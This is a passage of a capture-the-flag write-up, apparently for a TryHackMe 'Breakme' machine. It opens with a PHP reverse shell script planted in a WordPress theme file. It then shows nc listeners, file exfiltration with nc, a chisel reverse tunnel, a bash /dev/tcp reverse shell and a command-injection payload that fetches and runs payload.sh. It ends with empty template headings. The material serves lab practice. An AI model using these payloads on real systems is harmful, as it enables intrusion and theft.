	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```
### Location path
```bash
http://breakme.thm/wordpress/wp-content/themes/twentytwentyone/404.php
```
![rev_php](rev.png)

### Reverse shell
```bash
> curl -X POST http://breakme.thm/wordpress/wp-content/themes/twentytwentyone/404.php
```
```bash
> nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.23.93.75] from (UNKNOWN) [10.201.13.222] 44822
Linux Breakme 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64 GNU/Linux
 11:07:56 up  1:53,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (634): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Breakme:/$ 
```
## Post Exploitation Enumeration 
### Stable shell
```bash
www-data@Breakme:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@Breakme:/$ export TERM=linux 

CTRL+Z

> stty raw -echo && fg
[1]  + 129593 continued  nc -lvnp 9001 # and hit enter
```
### User enumeration 
```bash
www-data@Breakme:/home$ ls -al
total 32
drwxr-xr-x  5 root   root  4096 Feb  3  2024 .
drwxr-xr-x 18 root   root  4096 Aug 17  2021 ..
drwxr-xr-x  4 john   john  4096 Aug  3  2023 john
drwx------  2 root   root 16384 Aug 17  2021 lost+found
drwxr-x---  4 youcef john  4096 Aug  3  2023 youcef
www-data@Breakme:/home$ 
```
```bash
www-data@Breakme:/$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       breakme

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
### Lateral Movement 
```bash
www-data@Breakme:/home$ cat /etc/passwd | grep $100
cat /etc/passwd | grep $100
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
john:x:1002:1002:john wick,14,14,14:/home/john:/bin/bash
youcef:x:1000:1000:youcef,17,17,17:/home/youcef:/bin/bash
```
```bash
www-data@Breakme:/tmp$ ./rustscan -a 127.0.0.1
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Exploring the digital landscape, one IP at a time.

[~] The config file is expected to be at "/var/www/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 8092'.
Open 127.0.0.1:22
Open 127.0.0.1:80
Open 127.0.0.1:3306
Open 127.0.0.1:9999
Open 127.0.0.1:49472
```
```bash
www-data@Breakme:/tmp$ chmod +x linpeas.sh && ls -al lin*
-rwxrwxrwx 1 www-data www-data 956174 Aug 17 12:07 linpeas.sh
www-data@Breakme:/tmp$ ./linpeas.sh 2>&1 | tee linpeas_output.txt
```

### cron jobs
```bash
www-data@Breakme:/tmp$ ls
linpeas.sh  linpeas_output.txt
www-data@Breakme:/tmp$ wget http://10.23.93.75:8000/pspy64
--2025-08-18 12:45:38--  http://10.23.93.75:8000/pspy64
Connecting to 10.23.93.75:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.96M   355KB/s    in 13s     

2025-08-18 12:45:52 (235 KB/s) - ‘pspy64’ saved [3104768/3104768]

www-data@Breakme:/tmp$ chmod 777 pspy64
www-data@Breakme:/tmp$ ./pspy64 2>&1 | tee pspy_output.txt 
```
```bash
www-data@Breakme:/tmp$ ls -al
total 6052
drwxrwxrwt  2 root     root        4096 Aug 18 12:53 .
drwxr-xr-x 18 root     root        4096 Aug 17  2021 ..
-rwxrwxrwx  1 www-data www-data  956174 Aug 18 12:25 linpeas.sh
-rw-rw-rw-  1 www-data www-data  193204 Aug 18 12:56 linpeas_output.txt
-rwxrwxrwx  1 www-data www-data 3104768 Aug 18 12:41 pspy64
-rw-rw-rw-  1 www-data www-data 1926075 Aug 18 12:56 pspy64_output.txt
www-data@Breakme:/tmp$ nc -nv 10.23.93.75 8000 < pspy64_output.txt
Connection to 10.23.93.75 8000 port [tcp/*] succeeded!
```
```bash
# attacker machine 
> nc -nlvp 8000 > pspy64_output.txt
listening on [any] 8000 ...
connect to [10.23.93.75] from (UNKNOWN) [10.201.60.118] 38236
```
```bash
> cat pspy64_output.txt | grep 1002
2025/08/18 12:53:43 CMD: UID=1002  PID=517    | /usr/bin/php -S 127.0.0.1:9999 
2025/08/18 12:55:09 CMD: UID=33    PID=310022 | 

> cat pspy64_output.txt | grep john
2025/08/18 12:54:00 CMD: UID=33    PID=301485 | grep -HnRIEi (blockchain[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['"]([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[0-9a-f]{12})['"] /home/john/.bash_logout 
~/breakme > 
```

### Reverse tunneling (chisel or ligolo-ng)
```bash
# kali
> chisel server -p 5000 --reverse
2025/08/18 13:07:34 server: Reverse tunnelling enabled
2025/08/18 13:07:34 server: Fingerprint aolRo3Xlyk3CBBfp/wKQdoW+XC2PqDnTsR8ynKABNc0=
2025/08/18 13:07:34 server: Listening on http://0.0.0.0:5000
# response
2025/08/18 13:14:29 server: session#1: Client version (1.10.1) differs from server version (1.10.1-0kali1)
2025/08/18 13:14:29 server: session#1: tun: proxy#R:4444=>localhost:9999: Listening

# target 
www-data@Breakme:/tmp$ chmod 777 chisel_1.10.1_linux_amd64
www-data@Breakme:/tmp$ ./chisel_1.10.1_linux_amd64 client  10.23.93.75:5000 R:4444:localhost:9999
2025/08/18 13:14:26 client: Connecting to ws://10.23.93.75:5000
2025/08/18 13:14:29 client: Connected (Latency 338.952295ms)
```
```bash
~/breakme > netstat -antop | grep 4444
tcp6       0      0 :::4444                 :::*                    LISTEN      75309/chisel         off (0.00/0/0)
```
### Internal Service mapping
```bash
 
> nmap localhost -p 4444 -A -sC
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 13:17 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000042s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
4444/tcp open  http    PHP cli server 5.5 or later (PHP 7.4.33)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Test
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6
OS details: Linux 2.6.32, Linux 5.0 - 6.2
Network Distance: 0 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.28 seconds
```
![command](command.png)


### Testing commmand injection, ssrf, lfi, rce 
```bash
> sudo tcpdump -i tun0 icmp
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:39:02.033305 IP breakme.thm > 10.23.93.75: ICMP echo request, id 2436, seq 1, length 64
13:39:02.033315 IP 10.23.93.75 > breakme.thm: ICMP echo reply, id 2436, seq 1, length 64
13:39:03.070680 IP breakme.thm > 10.23.93.75: ICMP echo request, id 2436, seq 2, length 64
13:39:03.070697 IP 10.23.93.75 > breakme.thm: ICMP echo reply, id 2436, seq 2, length 64
```
![tcpdmp](intercept.png)

### Lateral movement to john

```bash
# terminal 1 
/bin/bash -i >& /dev/tcp/10.23.93.75/9001 0>&1
```
```bash
# terminal 2 
python3 -m http.server 8000 
```
```bash
# terminal 3
> nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.23.93.75] from (UNKNOWN) [10.201.60.118] 49502
bash: cannot set terminal process group (517): Inappropriate ioctl for device
bash: no job control in this shell
john@Breakme:~/internal$ 
```
```bash
# terminal 4
curl -X POST http://localhost:4444 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: PHPSESSID=oksd2bsnsg8prgtn4gshjvp0q5" \
  -d "cmd2=%7Ccurl%24%7BIFS%7Dhttp%3A%2F%2F10.23.93.75%3A8000%2Fpayload.sh%7Cbash"
```

### Lateral movement to youcef
```bash
john@Breakme:/home/youcef$ ls
ls
readfile
readfile.c
john@Breakme:/home/youcef$ 
```
### Flags 
- flag 1
    - 5c3ea0d31[redacted]13785b26677



### Gaining Root 

## Post-Exploitation
### Flags
### Covering Tracks 

## Reporting
### Summary
# Web Hacking Phases
 

## Reconnaissance
### Front-End Recon
### Web Application Enumeration
### Fingerprinting Web Servers
### Inspecting HTTP Response Headers and Sitemaps

## Mapping and Discovery
### Adding Localhost
### Debugging Page Content
### Technology Stack Identification
### Directory and File Listings

## Vulnerability Analysis
### Security Testing
### Enumerating APIs
### Vulnerability Identification

## Exploitation
### Post Exploitation Enumeration 
### Lateral Movement 
### Gaining Root 

## Post-Exploitation
### Flags
### Covering Tracks 

## Reporting
### Summary
